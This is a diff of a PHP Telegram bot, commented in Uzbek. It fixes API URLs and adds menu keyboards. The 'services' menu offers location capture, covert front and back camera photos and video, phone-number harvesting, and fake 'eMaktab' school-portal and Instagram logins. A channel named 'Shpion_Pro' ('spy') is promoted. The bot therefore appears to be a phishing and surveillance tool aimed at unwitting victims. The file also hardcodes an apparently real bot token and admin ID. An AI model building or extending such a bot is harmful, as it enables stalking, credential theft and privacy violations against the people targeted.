@@ -4,10 +4,10 @@
 // Asosiy sozlamalar (Yangi bot tokeni va Ngrok havolasi kiritildi)
 define("BOT_TOKEN", "8799087495:AAH6chgp1Mm3P-0Zz9sKi3wBYingNkNIBU0");
 define("BASE_URL", "https://ngrok-free.dev");
-define("ADMIN_PANEL_URL", "https://ngrok-free.devadmin.php");
+define("ADMIN_PANEL_URL", "https://ngrok-free.dev/admin.php");
 
 define("ADMIN_ID", "8543318228");
-define("ADMIN_USERNAME", "@JustSeenHelp");
+define("ADMIN_USERNAME", "@sherikboyevk");
 
 // Fayl yo'llari
 define("DB_FILE", __DIR__ . "/MUHECTUP/bot_db.sqlite");
@@ -188,7 +188,7 @@ function getUserFromKey($key) {
 
 // Telegram API
 function tgRequest($method, $params = [], $isFile = false) {
-    $url = "https://telegram.org" . BOT_TOKEN . "/" . $method;
+    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/" . $method;
 
     if (isset($params['reply_markup']) && !is_string($params['reply_markup'])) {
         $params['reply_markup'] = json_encode($params['reply_markup']);
@@ -306,4 +306,67 @@ function checkSubscription($chat_id) {
     }
     return true;
 }
+
+// Admin tekshirish
+function isAdmin($chat_id) {
+    return $chat_id == ADMIN_ID;
+}
+
+// Asosiy keyboard
+function mainKeyboard() {
+    return [
+        'keyboard' => [
+            [
+                ['text' => '🔐 Xizmatlar'],
+                ['text' => '📊 Statistika']
+            ],
+            [
+                ['text' => '❓ Yordam'],
+                ['text' => '⚙️ Sozlamalar']
+            ]
+        ],
+        'resize_keyboard' => true,
+        'one_time_keyboard' => false
+    ];
+}
+
+// Xizmatlar keyboard
+function servicesKeyboard() {
+    return [
+        'keyboard' => [
+            [
+                ['text' => '📍 Lokatsiya olish'],
+                ['text' => '📷 Rasm olish']
+            ],
+            [
+                ['text' => '🎥 Video yozish'],
+                ['text' => '📹 Orqa kamera']
+            ],
+            [
+                ['text' => '📞 Telefon raqam'],
+                ['text' => '🔐 eMaktab Login']
+            ],
+            [
+                ['text' => '📱 Instagram Login'],
+                ['text' => '🔙 Orqaga']
+            ]
+        ],
+        'resize_keyboard' => true
+    ];
+}
+
+// Obuna talab keyboard
+function needSubscribeKeyboard() {
+    return [
+        'inline_keyboard' => [
+            [
+                ['text' => '📢 Kanallarga obuna bo\'lish', 'url' => 'https://t.me/Shpion_Pro']
+            ],
+            [
+                ['text' => '✅ Tekshirish', 'callback_data' => 'check_subscribe']
+            ]
+        ]
+    ];
+}
+
 ?>
